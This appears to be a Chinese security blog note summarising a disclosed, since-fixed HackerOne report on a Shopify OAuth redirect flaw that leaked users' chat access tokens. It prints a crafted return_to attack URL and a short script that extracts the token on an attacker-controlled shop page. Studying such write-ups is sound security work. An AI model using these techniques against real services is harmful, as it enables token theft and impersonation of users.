# 漏洞散记
##  Shopify的信息窃取
> Shopify的一个漏洞，作者给的定义是信息窃取，也确实达到了这个漏洞的效果，但是个人觉得，定义为重定向更好一点，因为漏洞的成因是因为能重定向到一个能够被attacker完全定义Html与javascrip的地址上，所以才能记录用户的token。题外话，至于为什么我说是无良厂商，是因为有一次不仅不承认我的漏洞，还把我给N/A了，感觉很气

> 漏洞价值:1500$

>源地址:[#151058](https://hackerone.com/reports/151058)

## 漏洞过程

正如之前所说的一样，漏洞还是出现在了重定向的URL中，而且同样是一个认证的重定向链接:
```
https://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93&auth_type=chat&return_to=https%3A%2F%2Flivechat.shopify.com%2Fcustomer%2Fchats%2Fnew&shop=<shop>.myshopify.com
```

如上链接是Shopify的一个在线服务功能，具体的业务流程就是你先经过权限认证后，就会跳转到**livechat.shopify.com**，然后实现在线提问，参数shop是需要验证的商店，若之前就已经登录了商店的话，就会直接按照**return_to**这个参数进行跳转

### 突破点

The problem is that you have configured your oauth redirect_uri (the return_to parameter ) to accept any link like this:

    <anything>.shopify.com/
    <anything>.myshopify.com/

重定向的URL接收这些URL类型，而偏偏Shopify可以定制自己商店的HTML与javascript，所以作者更改了**return_to**的值

```
https://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93&auth_type=chat&return_to=https://<attacker_shop>.myshopify.com/&shop=<victim_shop>.myshopify.com
```
若已经认证过权限的用户点击链接后，将会跳转到**attacker.myshopify.com**，并且携带自己的认证token

简单来说就是被重定向到了
```
https://<attacker_shop>.myshopify.com/?auth_code=<access_token>
```
接下来，attacker只要在自己的页面中添加如下代码:
```
<script>
 var token = window.location.search.match(/auth_code=([^&]+)/);
      if (token && token.length > 1) {
        alert("Your access token is: " + token[1]);
        document.write("Attacker can use it to chat with support agents as you and he will be able to get your email <br> <b>Go to https://livechat.shopify.com/customer/chats/new?auth_type=chat&auth_code=" + token[1]);
      }

</script>

```
受害者的token将会以弹框的方式展示

## 结语

就在写这篇散记的时候，漏洞是已经修复的，当我去尝试更改**return_to**的值时，页面会显示：
```
return_to parameter is invalid
```
然而我偶然想到之前写的HPP的攻击方式，所以我去尝试了一下,发现简单的测试并没有成功

重定向的漏洞并不是很难发现，就看能不能多去尝试，此漏洞作者只是在最有可能的地方改了自己想改的东西，结合程序本身的服务，扩大了漏洞的影响，因为挖到了$1500
